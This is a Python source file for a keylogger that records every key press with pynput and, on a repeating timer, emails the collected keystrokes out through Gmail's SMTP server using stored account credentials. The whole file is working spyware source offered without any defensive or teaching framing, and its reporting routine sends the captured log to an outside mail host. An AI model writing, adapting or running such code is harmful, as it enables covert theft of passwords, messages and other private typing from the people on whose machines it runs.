#!/usr/bin/env python

import pynput.keyboard
import smtplib
import threading


class KeyLogger:

    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log += string

    # captures key press events
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    # sends email with the log
    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print("Error sending email: {e}")

    #sends email every interval
    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""  
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # intializes the keylogger
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            keyboard_listener.join()

